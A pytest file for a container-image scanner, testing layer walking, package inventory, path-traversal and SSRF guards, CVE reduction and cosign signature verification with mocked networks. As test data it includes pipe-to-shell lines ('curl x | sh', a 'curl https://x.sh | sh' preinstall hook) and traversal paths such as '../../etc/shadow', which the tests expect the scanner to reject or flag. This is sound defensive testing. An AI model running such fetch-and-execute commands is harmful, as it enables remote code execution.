"""Container image layer walk + image CVE / cosign checks (src.scanner.docker_layers,
src.scanner.docker_image). Network-free: layers are built in memory, the registry and
OSV are httpx MockTransports, and the cosign certificate is generated locally."""
from __future__ import annotations

import base64
import datetime as dt
import gzip
import hashlib
import io
import json
import tarfile

import httpx
import pytest

from src.scanner import docker_layers as dl
from src.scanner.docker_image import (
    has_released_fix,
    image_deps,
    image_summary,
    reduce_image_vulns,
    verify_simple_signing,
)
from src.scanner.docker_layers import (
    ImagePackage,
    app_file_priority,
    normalize_member,
    osv_ecosystem,
    package_from_path,
    parse_apk_installed,
    parse_dpkg_status,
    parse_npm_manifest,
    parse_os_release,
)
from src.scanner.lockfiles import Dep

REG = "https://registry-1.docker.io"
HOSTS = frozenset({"registry-1.docker.io", "auth.docker.io"})


# ── helpers ───────────────────────────────────────────────────────────────────
def _tar(entries: dict[str, bytes | None], *, gz: bool = True) -> bytes:
    """A layer tar: path -> bytes (None = a directory)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for path, data in entries.items():
            info = tarfile.TarInfo(path)
            if data is None:
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    raw = buf.getvalue()
    return gzip.compress(raw) if gz else raw


def _layer(blob: bytes, media: str = "application/vnd.oci.image.layer.v1.tar+gzip") -> dict:
    return {"mediaType": media, "digest": "sha256:" + hashlib.sha256(blob).hexdigest(),
            "size": len(blob)}


def _client(blobs: dict[str, bytes]) -> httpx.AsyncClient:
    def handler(request: httpx.Request) -> httpx.Response:
        dig = request.url.path.rsplit("/", 1)[-1]
        if dig in blobs:
            return httpx.Response(200, content=blobs[dig])
        return httpx.Response(404)
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


@pytest.fixture(autouse=True)
def _no_dns(monkeypatch):
    """The SSRF guard resolves hostnames; the mocked registry host needs no DNS. The
    scheme / IP-literal checks still run (see the SSRF test)."""
    real = dl.validate_url_https

    def guard(url, *, field_name="url"):
        if not url.startswith("https://") or "://10." in url or "://127." in url:
            return real(url, field_name=field_name)
        return url
    monkeypatch.setattr(dl, "validate_url_https", guard)


async def _scan(layers_blobs: list[tuple[bytes, str]], **kw) -> dl.LayerScan:
    """layers_blobs: base first, as in a manifest."""
    layers = [_layer(b, m) for b, m in layers_blobs]
    blobs = {ly["digest"]: b for ly, (b, _m) in zip(layers, layers_blobs)}
    async with _client(blobs) as client:
        return await dl.scan_image_layers(REG, "library/x", layers, token="t",
                                          client=client, allowed_hosts=HOSTS, **kw)


GZ = "application/vnd.oci.image.layer.v1.tar+gzip"

DPKG = b"""Package: libssl3
Status: install ok installed
Version: 3.0.15-1~deb12u1
Source: openssl
Description: TLS
 continuation line

Package: zlib1g
Status: install ok installed
Version: 1:1.2.13.dfsg-1
Source: zlib (1:1.2.13.dfsg-1)

Package: gone
Status: deinstall ok config-files
Version: 1.0
"""


# ── pure parsers ──────────────────────────────────────────────────────────────
def test_parse_dpkg_status_uses_source_package_and_skips_removed():
    pkgs = parse_dpkg_status(DPKG.decode())
    assert [(p.name, p.source, p.source_version) for p in pkgs] == [
        ("libssl3", "openssl", "3.0.15-1~deb12u1"),
        ("zlib1g", "zlib", "1:1.2.13.dfsg-1"),
    ]


def test_parse_apk_installed_uses_origin():
    text = "C:Q1x\nP:libcrypto3\nV:3.3.2-r0\no:openssl\n\nP:musl\nV:1.2.5-r0\n"
    pkgs = parse_apk_installed(text)
    assert [(p.name, p.version, p.source) for p in pkgs] == [
        ("libcrypto3", "3.3.2-r0", "openssl"), ("musl", "1.2.5-r0", "musl")]


def test_language_packages_from_paths_and_manifests():
    p = package_from_path("usr/local/lib/python3.12/site-packages/urllib3-2.2.1.dist-info/METADATA")
    assert (p.ecosystem, p.name, p.version) == ("PyPI", "urllib3", "2.2.1")
    assert package_from_path("app/requests-2.0.dist-info/RECORD") is None
    n = parse_npm_manifest(b'{"name": "left-pad", "version": "1.3.0"}')
    assert (n.ecosystem, n.name, n.version) == ("npm", "left-pad", "1.3.0")
    assert parse_npm_manifest(b"not json") is None
    assert parse_npm_manifest(b'{"name": "x"}') is None


def test_normalize_member_refuses_traversal_and_keeps_dotfiles():
    assert normalize_member("./app/server.js") == "app/server.js"
    assert normalize_member("/etc/passwd") == "etc/passwd"
    assert normalize_member("root/.bashrc") == "root/.bashrc"
    assert normalize_member("app/.wh.old.js") == "app/.wh.old.js"
    assert normalize_member("../../etc/shadow") is None
    assert normalize_member("app/../../x") is None
    assert normalize_member("./") is None


def test_app_file_priority_skips_base_os_and_third_party():
    assert app_file_priority("app/server.js") == 0
    assert app_file_priority("docker-entrypoint.sh") == 1
    assert app_file_priority("usr/local/bin/docker-entrypoint.sh") == 1
    assert app_file_priority("etc/nginx/nginx.conf") == 2
    for skipped in ("usr/lib/x86_64-linux-gnu/libc.so.6", "usr/share/doc/a/README",
                    "app/node_modules/lodash/index.js", "usr/local/bin/pip",
                    "usr/local/lib/python3.12/site-packages/a.py", "app/logo.png",
                    "opt/yarn-v1.22.22/lib/cli.js", "etc/ssl/certs/ca.pem"):
        assert app_file_priority(skipped) is None, skipped


def test_osv_ecosystem_ids():
    assert osv_ecosystem(parse_os_release('ID=debian\nVERSION_ID="12"\n')) == "Debian:12"
    assert osv_ecosystem({"ID": "ubuntu", "VERSION_ID": "22.04",
                          "VERSION": "22.04.4 LTS (Jammy Jellyfish)"}) == "Ubuntu:22.04:LTS"
    assert osv_ecosystem({"ID": "ubuntu", "VERSION_ID": "24.10"}) == "Ubuntu:24.10"
    assert osv_ecosystem({"ID": "alpine", "VERSION_ID": "3.20.3"}) == "Alpine:v3.20"
    assert osv_ecosystem({"ID": "wolfi"}) is None
    assert osv_ecosystem({}) is None


# ── the layer walk ────────────────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_walk_reads_app_files_and_inventory_newest_first():
    base = _tar({
        "etc/os-release": b'ID=debian\nVERSION_ID="12"\nPRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n',
        "var/lib/dpkg/status": DPKG,
        "usr/lib/libz.so.1": b"\x7fELF\x00binary",
        "app/config.py": b"OLD = True\n",
        "app/removed.py": b"gone = 1\n",
        "app/cache/": None,
        "app/cache/old.py": b"x = 1\n",
    })
    app = _tar({
        "app/config.py": b"NEW = True\n",            # shadows the base copy
        "app/.wh.removed.py": b"",                    # whiteout: hides base file
        "app/cache/.wh..wh..opq": b"",                # opaque: hides base dir content
        "app/cache/new.py": b"y = 2\n",
        "app/server.py": b"print('hi')\n",
        "app/node_modules/left-pad/package.json": b'{"name":"left-pad","version":"1.3.0"}',
        "usr/local/lib/python3.12/site-packages/urllib3-2.2.1.dist-info/METADATA": b"Name: urllib3",
        "app/blob.dat": b"\x00\x01\x02",
    })
    scan = await _scan([(base, GZ), (app, GZ)])
    assert scan.depth == "full" and scan.layers_scanned == 2 and scan.reason is None
    assert scan.files["app/config.py"].text == "NEW = True\n"
    assert "app/removed.py" not in scan.files
    assert "app/cache/old.py" not in scan.files and "app/cache/new.py" in scan.files
    assert "app/blob.dat" not in scan.files and "usr/lib/libz.so.1" not in scan.files
    assert scan.os_release["ID"] == "debian"
    eco = {(p.ecosystem, p.name) for p in scan.packages}
    assert {("dpkg", "libssl3"), ("dpkg", "zlib1g"), ("npm", "left-pad"),
            ("PyPI", "urllib3")} <= eco
    s = scan.summary()
    assert s["app_files"] == len(scan.files) and s["packages"] == len(scan.packages)


@pytest.mark.asyncio
async def test_upper_dpkg_database_wins():
    base = _tar({"var/lib/dpkg/status": DPKG})
    upper = _tar({"var/lib/dpkg/status":
                  b"Package: libssl3\nStatus: install ok installed\nVersion: 3.0.16-1\n"
                  b"Source: openssl\n"})
    scan = await _scan([(base, GZ), (upper, GZ)])
    assert [(p.name, p.version) for p in scan.packages] == [("libssl3", "3.0.16-1")]


@pytest.mark.asyncio
async def test_plain_tar_layers_are_read_and_zstd_is_skipped_with_reason():
    plain = _tar({"app/a.py": b"a = 1\n"}, gz=False)
    zst = b"(not really zstd)"
    scan = await _scan([(plain, "application/vnd.oci.image.layer.v1.tar"),
                        (zst, "application/vnd.oci.image.layer.v1.tar+zstd")])
    assert "app/a.py" in scan.files
    assert scan.depth == "partial"
    assert scan.summary()["layers_skipped"] == [{"reason": "unsupported compression", "count": 1}]


@pytest.mark.asyncio
async def test_digest_mismatch_is_never_read():
    good = _tar({"app/a.py": b"a = 1\n"})
    layer = _layer(good)
    tampered = _tar({"app/a.py": b"import os; os.system('curl x | sh')\n"})
    async with _client({layer["digest"]: tampered}) as client:
        scan = await dl.scan_image_layers(REG, "library/x", [layer], token="t",
                                          client=client, allowed_hosts=HOSTS)
    assert scan.files == {} and scan.depth == "config"
    assert scan.skipped[0]["reason"] == "download failed or digest mismatch"


@pytest.mark.asyncio
async def test_decompression_budget_stops_the_walk(monkeypatch):
    monkeypatch.setattr(dl, "MAX_TOTAL_WALKED", 1000)
    bomb = _tar({"app/a.py": b"a = 1\n", "app/big.txt": b"0" * 50_000,
                 "app/later.py": b"b = 2\n"})
    lower = _tar({"app/base.py": b"c = 3\n"})
    scan = await _scan([(lower, GZ), (bomb, GZ)])
    assert scan.depth == "partial"
    assert scan.reason == "decompressed-size budget reached"
    assert "app/later.py" not in scan.files and "app/base.py" not in scan.files


@pytest.mark.asyncio
async def test_time_budget_degrades_to_config_only():
    scan = await _scan([(_tar({"app/a.py": b"a\n"}), GZ)], time_budget=-1)
    assert scan.depth == "config" and scan.files == {}
    assert scan.reason == "time budget reached"


@pytest.mark.asyncio
async def test_oversized_layer_is_skipped(monkeypatch):
    monkeypatch.setattr(dl, "MAX_LAYER_COMPRESSED", 10)
    scan = await _scan([(_tar({"app/a.py": b"a\n"}), GZ)])
    assert scan.depth == "config"
    assert scan.skipped[0]["reason"] == "layer too large"


@pytest.mark.asyncio
async def test_layer_download_refuses_private_redirect():
    blob = _tar({"app/a.py": b"a\n"})
    layer = _layer(blob)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(307, headers={"location": "https://10.0.0.5/blob"})
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        scan = await dl.scan_image_layers(REG, "library/x", [layer], token="t",
                                          client=client, allowed_hosts=HOSTS)
    assert scan.files == {} and scan.depth == "config"


@pytest.mark.asyncio
async def test_registry_token_is_not_sent_to_a_cdn_redirect():
    blob = _tar({"app/a.py": b"a\n"})
    layer = _layer(blob)
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "registry-1.docker.io":
            return httpx.Response(307, headers={"location": "https://cdn.example.com/b"})
        seen["auth"] = request.headers.get("authorization")
        return httpx.Response(200, content=blob)
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        scan = await dl.scan_image_layers(REG, "library/x", [layer], token="secret",
                                          client=client, allowed_hosts=HOSTS)
    assert "app/a.py" in scan.files
    assert seen["auth"] is None


# ── image packages build-time manifests don't install anything ────────────────
def test_image_package_json_lifecycle_scripts_are_not_install_hooks():
    from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
    from src.scanner.artifact_scan import scan_artifact_files

    pj = json.dumps({"name": "app", "scripts": {"preinstall": "curl https://x.sh | sh"}})
    for eco, expect_hook in (("docker", False), ("npm", True)):
        fetched = ArtifactFetchResult(ecosystem=eco, name="x", version="1", kind="t", ok=True,
                                      files={"package.json": _make_file("package.json",
                                                                         pj.encode())})
        findings, _n, hook = scan_artifact_files(fetched)
        assert hook is expect_hook, eco
        assert any(f.category == "install_hook" for f in findings) is expect_hook, eco


# ── CVE reduction ─────────────────────────────────────────────────────────────
def _vuln(vid, eco, name, fixed=None, cvss=None):
    events = [{"introduced": "0"}] + ([{"fixed": fixed}] if fixed else [])
    v = {"id": vid, "summary": vid, "affected": [
        {"package": {"ecosystem": eco, "name": name}, "ranges": [{"type": "ECOSYSTEM",
                                                                  "events": events}]}]}
    if cvss:
        v["severity"] = [{"type": "CVSS_V3", "score": cvss}]
    return v


def test_image_deps_query_source_packages_once_and_mark_os_transitive():
    pkgs = parse_dpkg_status(DPKG.decode()) + [
        ImagePackage("dpkg", "libssl-dev", "3.0.15-1~deb12u1", "os", "openssl",
                     "3.0.15-1~deb12u1"),
        ImagePackage("PyPI", "urllib3", "2.2.1", "lang"),
    ]
    deps, eco = image_deps(pkgs, {"ID": "debian", "VERSION_ID": "12"})
    assert eco == "Debian:12"
    names = [(d.ecosystem, d.name) for d in deps]
    assert names.count(("Debian:12", "openssl")) == 1
    assert ("PyPI", "urllib3") in names
    assert all(d.direct is False for d in deps if d.ecosystem == "Debian:12")
    assert next(d for d in deps if d.name == "urllib3").direct is True
    deps2, eco2 = image_deps(pkgs, {"ID": "wolfi"})
    assert eco2 is None and [d.name for d in deps2] == ["urllib3"]


def test_only_advisories_with_a_released_fix_become_findings():
    deps = [Dep(ecosystem="Debian:12", name="openssl", version="3.0.15-1", direct=False)]
    crit = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    details = {
        "DEBIAN-CVE-1": _vuln("DEBIAN-CVE-1", "Debian:12", "openssl", "3.0.16-1", crit),
        "DEBIAN-CVE-2": _vuln("DEBIAN-CVE-2", "Debian:12", "openssl", None, crit),
        "DEBIAN-CVE-3": _vuln("DEBIAN-CVE-3", "Debian:13", "openssl", "3.5.0-1", crit),
    }
    batch = [{"vulns": [{"id": "DEBIAN-CVE-1"}, {"id": "DEBIAN-CVE-2"},
                        {"id": "DEBIAN-CVE-3"}, {"id": "DEBIAN-CVE-4"}]}]
    findings, summary = reduce_image_vulns(deps, batch, details, label="image packages")
    assert [f["name"] for f in findings] == [
        "Vulnerable dependency: openssl@3.0.15-1 (DEBIAN-CVE-1)"]
    f = findings[0]
    assert f["category"] == "dependency" and f["severity"] == "critical"
    assert f["reachability"] == "transitive"
    assert "3.0.16-1" in f["remediation"]
    assert summary["vulns_total"] == 4 and summary["fixable"] == 1
    assert summary["unfixed"] == 2 and summary["unchecked"] == 1


def test_known_malicious_language_package_is_kept_and_named():
    deps = [Dep(ecosystem="npm", name="evil", version="1.0.0")]
    details = {"MAL-2026-1": {"id": "MAL-2026-1", "summary": "malicious code in evil"}}
    findings, summary = reduce_image_vulns(deps, [{"vulns": [{"id": "MAL-2026-1"}]}],
                                           details, label="image packages")
    assert findings[0]["name"].startswith("Known-malicious package")
    assert summary["malicious"] == ["MAL-2026-1"]
    assert has_released_fix(details["MAL-2026-1"], deps[0]) is True


def test_dependency_findings_never_decide_but_malicious_does():
    from src.scanner.verdict import decide

    base = {"trust_score": 70, "findings": {"items": [
        {"category": "dependency", "severity": "critical", "shipped": True,
         "name": "Vulnerable dependency: openssl@1 (DEBIAN-CVE-1)"}]}}
    assert decide(base).decision == "safe"
    mal = {"trust_score": 70, "findings": {"items": [
        {"category": "dependency", "severity": "critical", "shipped": True,
         "name": "Known-malicious package: evil@1.0.0 (MAL-2026-1)"}]}}
    assert decide(mal).decision == "do_not_connect"


def test_image_summary_shape():
    s = image_summary({"layers": {"depth": "partial", "layers_total": 5, "layers_scanned": 3,
                                  "layers_skipped": [{"reason": "image too large", "count": 2}],
                                  "app_files": 40, "packages": 120, "reason": "image too large"},
                       "os_release": {"PRETTY_NAME": "Debian GNU/Linux 12 (bookworm)"},
                       "index_digest": "sha256:ab"},
                      {"ok": True, "fixable": 3, "db_snapshots": {"osv": "2026-10-09"}})
    assert s["depth"] == "partial" and s["os"] == "Debian GNU/Linux 12"
    assert s["vulnerabilities"] == {"ok": True, "fixable": 3}


# ── cosign simple-signing verification ────────────────────────────────────────
def _fulcio_cert(san: str, issuer: str, repo_uri: str | None = None):
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.ORGANIZATION_NAME, "sigstore.dev")])
    now = dt.datetime.now(dt.timezone.utc)
    b = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
         .public_key(key.public_key()).serial_number(1)
         .not_valid_before(now).not_valid_after(now + dt.timedelta(minutes=10))
         .add_extension(x509.SubjectAlternativeName(
             [x509.UniformResourceIdentifier(san)]), critical=False)
         .add_extension(x509.UnrecognizedExtension(
             x509.ObjectIdentifier("1.3.6.1.4.1.57264.1.1"), issuer.encode()), critical=False))
    if repo_uri:
        raw = repo_uri.encode()
        b = b.add_extension(x509.UnrecognizedExtension(
            x509.ObjectIdentifier("1.3.6.1.4.1.57264.1.12"),
            bytes([0x0C, len(raw)]) + raw), critical=False)
    cert = b.sign(key, hashes.SHA256())
    return key, cert.public_bytes(serialization.Encoding.DER)


def _signed(key, digest: str):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec

    payload = json.dumps({"critical": {"identity": {"docker-reference": "ghcr.io/o/app"},
                                       "image": {"docker-manifest-digest": digest},
                                       "type": "cosign container image signature"},
                          "optional": None}).encode()
    return payload, key.sign(payload, ec.ECDSA(hashes.SHA256()))


GH = "https://token.actions.githubusercontent.com"
SAN = "https://github.com/o/app/.github/workflows/release.yml@refs/tags/v1"
DIGEST = "sha256:" + "ab" * 32


def test_cosign_signature_verifies_and_binds_source():
    key, cert = _fulcio_cert(SAN, GH, "https://github.com/o/app")
    payload, sig = _signed(key, DIGEST)
    res = verify_simple_signing(payload, sig, cert, coordinate="ghcr.io/o/app@x",
                                image_digests=(DIGEST,), claimed_repo="https://github.com/o/app")
    assert res.verified is True and res.signature_valid is True
    assert res.binding["repo"] == "github.com/o/app"
    assert res.source_matches_claim is True and res.certified_eligible is True


def test_cosign_tampered_payload_fails():
    key, cert = _fulcio_cert(SAN, GH)
    payload, sig = _signed(key, DIGEST)
    res = verify_simple_signing(payload.replace(b"ab", b"cd", 1), sig, cert, coordinate="c",
                                image_digests=(DIGEST,), claimed_repo=None)
    assert res.present is True and res.signature_valid is False and res.verified is False


def test_cosign_signature_for_another_image_is_not_verified():
    key, cert = _fulcio_cert(SAN, GH)
    payload, sig = _signed(key, "sha256:" + "ff" * 32)
    res = verify_simple_signing(payload, sig, cert, coordinate="c",
                                image_digests=(DIGEST,), claimed_repo=None)
    assert res.signature_valid is True and res.subject_matches is False
    assert res.verified is False


def test_cosign_signer_from_another_repo_is_a_mismatch():
    key, cert = _fulcio_cert("https://github.com/attacker/x/.github/workflows/a.yml@refs/heads/main",
                             GH, "https://github.com/attacker/x")
    payload, sig = _signed(key, DIGEST)
    res = verify_simple_signing(payload, sig, cert, coordinate="c", image_digests=(DIGEST,),
                                claimed_repo="https://github.com/o/app")
    assert res.verified is False and res.source_matches_claim is False


def test_cosign_untrusted_issuer_is_not_verified():
    key, cert = _fulcio_cert(SAN, "https://self-hosted.example.com")
    payload, sig = _signed(key, DIGEST)
    res = verify_simple_signing(payload, sig, cert, coordinate="c", image_digests=(DIGEST,),
                                claimed_repo=None)
    assert res.signature_valid is True and res.verified is False


# ── scan_package wiring (network stubbed) ─────────────────────────────────────
@pytest.mark.asyncio
async def test_apply_docker_image_extras_folds_findings_summary_and_provenance(monkeypatch):
    from src.scanner import docker_image
    from src.scanner.artifact_fetch import ArtifactFetchResult
    from src.scanner.provenance import ProvenanceResult
    from src.scanner.scan import ScanResult

    async def fake_vulns(packages, os_release, *, client, time_budget=0):
        return ([{"category": "dependency", "name": "Vulnerable dependency: openssl@1 (D-1)",
                  "severity": "high", "file_path": "image packages", "line_number": 1,
                  "snippet": "", "remediation": "r", "reachability": "transitive"}],
                {"ok": True, "packages_checked": 2, "counts": {"high": 1},
                 "osv_ecosystem": "Debian:12", "packages_found": {"dpkg": 2},
                 "malicious": [], "db_snapshots": {"osv": "2026-10-09"}, "fixable": 1})

    async def fake_prov(image, *, display, client):
        return ProvenanceResult(surface="docker", coordinate=display)

    monkeypatch.setattr(docker_image, "check_image_vulnerabilities", fake_vulns)
    monkeypatch.setattr(docker_image, "analyze_image_provenance", fake_prov)
    fetched = ArtifactFetchResult(ecosystem="docker", name="nginx", version="latest",
                                  kind="image", ok=True, image={
                                      "packages": [ImagePackage("dpkg", "a", "1")],
                                      "os_release": {"ID": "debian", "VERSION_ID": "12"},
                                      "layers": {"depth": "full", "layers_total": 2,
                                                 "layers_scanned": 2}})
    result = ScanResult(repo="docker:nginx", stars=0, description="", framework="")
    result.artifact_scan = {"ok": True}
    result.coverage = {"db_snapshots": {"registry": "x"}}
    await docker_image.apply_docker_image_extras(result, fetched)
    assert [f.category for f in result.findings] == ["dependency"]
    assert result.supply_chain["scored"] is True and result.supply_chain["source"] == "image"
    assert result.coverage["db_snapshots"] == {"registry": "x", "osv": "2026-10-09"}
    assert result.artifact_scan["image"]["depth"] == "full"
    assert result.provenance["present"] is False


def test_signature_b64_roundtrip_helper():
    # the .sig annotation is standard base64; the provenance decoder accepts it
    from src.scanner.provenance import _b64d

    assert _b64d(base64.b64encode(b"sig").decode()) == b"sig"


@pytest.mark.asyncio
async def test_slow_osv_drops_the_cve_check_not_the_scan(monkeypatch):
    """The image scan has to finish inside the router's scan timeout, so a slow OSV
    answer is cut off and the rest of the result still lands."""
    import asyncio as _asyncio

    from src.scanner import docker_image
    from src.scanner.artifact_fetch import ArtifactFetchResult
    from src.scanner.scan import ScanResult

    async def slow(*a, **k):
        await _asyncio.sleep(5)

    monkeypatch.setattr(docker_image, "_VULN_TIME_BUDGET", 0.05)
    monkeypatch.setattr(docker_image, "check_image_vulnerabilities", slow)
    monkeypatch.setattr(docker_image, "analyze_image_provenance", slow)
    monkeypatch.setattr(docker_image, "_PROV_TIME_BUDGET", 0.05)
    fetched = ArtifactFetchResult(ecosystem="docker", name="nginx", version="latest",
                                  kind="image", ok=True, image={
                                      "packages": [ImagePackage("dpkg", "a", "1")],
                                      "layers": {"depth": "full"}})
    result = ScanResult(repo="docker:nginx", stars=0, description="", framework="")
    result.artifact_scan = {"ok": True}
    await _asyncio.wait_for(docker_image.apply_docker_image_extras(result, fetched), 3)
    img = result.artifact_scan["image"]
    assert img["depth"] == "full"
    assert img["vulnerabilities"]["ok"] is False
    assert result.findings == []
